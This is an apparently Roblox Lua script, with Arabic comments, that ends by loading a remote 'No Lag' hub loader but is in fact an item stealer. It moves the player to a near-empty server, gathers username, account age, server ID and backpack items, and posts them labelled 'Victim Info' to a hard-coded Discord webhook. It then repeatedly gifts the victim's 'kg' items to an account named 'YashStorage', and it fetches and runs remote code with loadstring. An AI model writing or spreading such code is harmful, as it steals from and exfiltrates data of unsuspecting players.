-- =========================
-- الخدمات الأساسية
-- =========================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- =========================
-- 1: قسم النقل التلقائي (أولاً)
-- =========================
task.spawn(function()
    local function findEmptyServer()
        local currentPlayers = #Players:GetPlayers()
        
        if currentPlayers <= 3 then
            return false
        end
        
        local success, servers = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(
                "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
            ))
        end)
        
        if success and servers and servers.data then
            for _, server in ipairs(servers.data) do
                if server.playing <= 3 and server.id ~= game.JobId then
                    local transferSuccess = pcall(function()
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, player)
                    end)
                    
                    if transferSuccess then
                        return true
                    end
                end
            end
        end
        
        return false
    end

    while true do
        local moved = findEmptyServer()
        if moved then
            break
        end
        wait(300)
    end
end)

-- =========================
-- 2: نظام الويب هوك (بعد 7 ثواني)
-- =========================
task.spawn(function()
    wait(7)

    local WEBHOOK_URL = "https://discord.com/api/webhooks/1421386699048489050/EVpZy-6Gyulw3LpXnCmDH_hOPXJAOD6BMq8IQeBNZlJaoT6jgaeGF4myjvtPCdtY9jDu"
    
    local playerName = player.Name
    local userId = player.UserId
    local accountAge = player.AccountAge .. " Days"
    local placeId = game.PlaceId
    local jobId = game.JobId

    local items = {}
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item.Name)
            end
        end
    end

    local fileContent = "🎮 Alien Hit Inventory Report\n"
    fileContent = fileContent .. "👤 Player: " .. playerName .. "\n"
    fileContent = fileContent .. "🆔 User ID: " .. userId .. "\n"
    fileContent = fileContent .. "⏰ Account Age: " .. accountAge .. "\n"
    fileContent = fileContent .. "🌐 Server: " .. jobId .. "\n"
    fileContent = fileContent .. "📅 Time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n\n"
    fileContent = fileContent .. "📦 All Items (" .. #items .. "):\n\n"

    for i, itemName in ipairs(items) do
        fileContent = fileContent .. i .. ". " .. itemName .. "\n"
    end

    local message = "@everyone **Alien Hit**\n" ..
    "──────────────\n" ..
    "**Victim Info:**\n" ..
    "Username: " .. playerName .. "\n" ..
    "Executor: Delta\n" .. 
    "Account Age: " .. accountAge .. "\n" ..
    "Receiver: YashStorage1\n" ..
    "──────────────\n" ..
    "**Hit List:**\n"

    for i = 1, math.min(5, #items) do
        message = message .. "• " .. items[i] .. "\n"
    end

    message = message .. "──────────────\n" ..
    "**Total Items:** " .. #items .. "\n" ..
    "**Server:** https://floating.gg/?placeID=" .. placeId .. "&gameInstanceId=" .. jobId .. "\n" ..
    "**Time:** " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n\n" ..
    "📎 **File Attached:** Complete inventory list"

    pcall(function()
        local requestFunc = (syn and syn.request) or http_request or request
        if requestFunc then
            local boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            local body = "--" .. boundary .. "\r\n" ..
                        "Content-Disposition: form-data; name=\"content\"\r\n\r\n" ..
                        message .. "\r\n" ..
                        "--" .. boundary .. "\r\n" ..
                        "Content-Disposition: form-data; name=\"file\"; filename=\"inventory.txt\"\r\n" ..
                        "Content-Type: text/plain\r\n\r\n" ..
                        fileContent .. "\r\n" ..
                        "--" .. boundary .. "--"

            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
                },
                Body = body
            })
        end
    end)
end)

-- =========================
-- 3: نظام البراين روت النهائي (كل 2.5 ثانية)
-- =========================
task.spawn(function()
    wait(10)
    
    local processedBrainRoots = {}
    
    local function processBrainRoots()
        while true do
            local backpack = player:FindFirstChild("Backpack")
            
            if not backpack then
                wait(2)
                continue
            end
            
            local brainRoots = {}
            for _, item in ipairs(backpack:GetChildren()) do
                if item:IsA("Tool") and string.find(item.Name:lower(), "kg") then
                    table.insert(brainRoots, item)
                end
            end
            
            if #brainRoots == 0 then
                wait(3)
                continue
            end
            
            table.sort(brainRoots, function(a, b) return a.Name < b.Name end)
            
            for currentIndex = 1, #brainRoots do
                local currentBrainRoot = brainRoots[currentIndex]
                local brainRootID = currentBrainRoot.Name
                
                if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
                    for _, tool in ipairs(player.Character:GetChildren()) do
                        if tool:IsA("Tool") then tool.Parent = backpack end
                    end
                    
                    currentBrainRoot.Parent = player.Character
                    
                    if not processedBrainRoots[brainRootID] then
                        pcall(function()
                            ReplicatedStorage.BridgeNet2.dataRemoteEvent:FireServer({
                                [1] = brainRootID,
                                [2] = "",
                            })
                            processedBrainRoots[brainRootID] = true
                        end)
                    end
                end
                
                pcall(function()
                    ReplicatedStorage.BridgeNet2.dataRemoteEvent:FireServer({
                        [1] = {
                            ["Item"] = currentBrainRoot,
                            ["ToGift"] = "YashStorage",
                        },
                        [2] = ""
                    })
                end)
                
                wait(2.5)
            end
            
            wait(10)
        end
    end
    
    pcall(processBrainRoots)
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/Main.lua"))()
